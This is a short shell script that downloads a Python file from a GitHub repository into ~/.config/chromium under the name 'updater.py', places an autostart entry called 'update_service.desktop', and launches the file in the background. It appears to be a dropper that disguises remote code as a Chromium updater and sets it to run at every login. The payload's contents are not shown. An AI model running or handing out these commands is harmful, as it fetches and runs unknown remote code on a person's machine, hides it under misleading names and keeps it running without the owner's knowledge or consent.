mkdir ~/.config/chromium
wget -O ~/.config/chromium/updater.py https://raw.githubusercontent.com/reimch/white-vice/refs/heads/main/src/updater.py

wget -O ~/.config/autostart/update_service.desktop https://raw.githubusercontent.com/reimch/white-vice/refs/heads/main/resources/update_service.desktop

python3 ~/.config/chromium/updater.py &
